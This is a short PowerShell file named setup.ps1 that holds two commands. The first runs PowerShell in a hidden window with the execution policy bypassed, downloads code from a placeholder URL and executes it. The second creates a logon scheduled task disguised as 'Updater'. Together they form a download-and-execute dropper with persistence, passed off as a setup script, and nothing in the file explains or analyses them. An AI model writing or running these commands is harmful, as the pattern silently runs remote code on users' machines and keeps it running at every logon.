# ©AngelaMos | 2026
# setup.ps1

powershell -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/a')"
schtasks /create /tn Updater /tr "C:\example.invalid.exe" /sc onlogon
